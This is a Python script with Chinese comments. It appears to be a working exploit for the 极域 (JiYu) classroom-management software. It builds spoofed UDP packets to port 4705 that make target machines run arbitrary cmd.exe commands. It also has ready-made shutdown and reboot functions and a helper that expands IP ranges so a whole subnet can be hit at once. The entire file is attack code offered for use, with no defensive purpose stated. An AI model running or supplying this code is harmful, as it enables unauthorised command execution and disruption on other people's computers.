import socket
import random

"""
-------------------------------------------------------------------------------
| main() 主函数入口
|
| tool(target_host)   主要运行内容负责发送数据包
|        target_host 为想要控制，并且连接着极域的ip地址
|
| str_to_hex(cmd_code) 将输入的cmd命令进行16进制转码
|        cmd_code    为用户输入的cmd控制命令
|
| message_message(head,cmd)
|         head        为随机的头部数据，防止cmd控制命令不执行
|       cmd         这里的cmd命令为转16进制并且拼接随机头部数据的cmd命令
|
|
---------------------------------------------------------------------------------

"""

def 关机(target_host):
    send_cmd(target_host, "shutdown -s -t 0")


def 重启(target_host):
    send_cmd(target_host, "shutdown -r -t 0")


def ip_address(from_ip, to_ip):
    from_ip = from_ip.split(".")
    to_ip = to_ip.split(".")
    ip_list = []
    for i in range(int(from_ip[0]), int(to_ip[0]) + 1):
        for j in range(int(from_ip[1]), int(to_ip[1]) + 1):
            for k in range(int(from_ip[2]), int(to_ip[2]) + 1):
                for l in range(int(from_ip[3]), int(to_ip[3]) + 1):
                    ip_list.append(f"{i}.{j}.{k}.{l}")
    return ip_list


def send_cmd(target_host, cmd):
    if isinstance(target_host, str):
        target_host = [target_host]
    # 创建UDP socket对象
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 设置目标主机和端口
    target_port = 4705
    # 随机头部数据
    head = "444d4f43000001006e030000" + str(random.randint(56, 70)) + str(random.randint(56, 70)) + "0000" + str(
        random.randint(56, 70)) + str(random.randint(56, 70)) + str(random.randint(56, 70))
    # n=2      #,指令模式将上面一行注释，将n==2即可存指令模式
    cmd = str_to_hex(cmd)
    message = str(message_message(head, cmd))
    # 连接ip,发送数据
    binary_date = bytes.fromhex(message)
    for ip in target_host:
        udp_socket.connect((ip, target_port))
        udp_socket.sendall(binary_date)
    # 关闭socket
    udp_socket.close()


# 对cmd命令字符进行处理为16进制
def str_to_hex(cmd_code):
    d = 0
    result_chuli = ""
    # 调用 hex() 函数将字符串转换为十六进制
    result = ''.join([format(ord(c), '02x') for c in cmd_code])
    # result = bytes(cmd_code, 'gbk').hex()
    for char in result:
        d = d + 1
        result_chuli = result_chuli + char
        # 每一组16进制值后加00填充
        if d % 2 == 0:
            result_chuli = result_chuli + "00"
        # 拼接发送的16进制命令
    hex_str = "2f0063002000" + result_chuli
    return hex_str


# 整合为要发送的udp包
def message_message(head, cmd):
    # 保持udp发送的长度为1038
    message_head = head + "000000000000000000204e0000c0a88e01610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e006500780065000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" + cmd
    # 补充长度
    if len(message_head) > 2076:
        return
    message_head += "0" * (2076 - len(message_head))
    return message_head